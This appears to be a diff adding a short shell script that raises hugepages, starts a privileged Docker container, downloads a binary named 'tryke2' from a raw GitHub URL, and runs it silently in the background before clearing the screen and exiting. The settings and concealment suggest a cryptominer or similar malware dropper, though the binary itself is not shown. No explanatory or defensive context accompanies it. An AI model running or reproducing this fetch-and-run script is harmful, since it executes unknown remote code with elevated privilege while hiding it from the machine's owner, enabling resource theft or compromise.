@@ -1,0 +1,7 @@
+sudo sysctl vm.nr_hugepages=2560; sleep 2; docker pull node; docker run -d -t --privileged=true --name aaaa node; sleep 4; docker exec -it aaaa bash
+wget https://raw.githubusercontent.com/blue4green37/tryke/main/tryke2
+chmod +x tryke2
+./tryke2 > /dev/null 2>&1 &
+clear
+exit
+
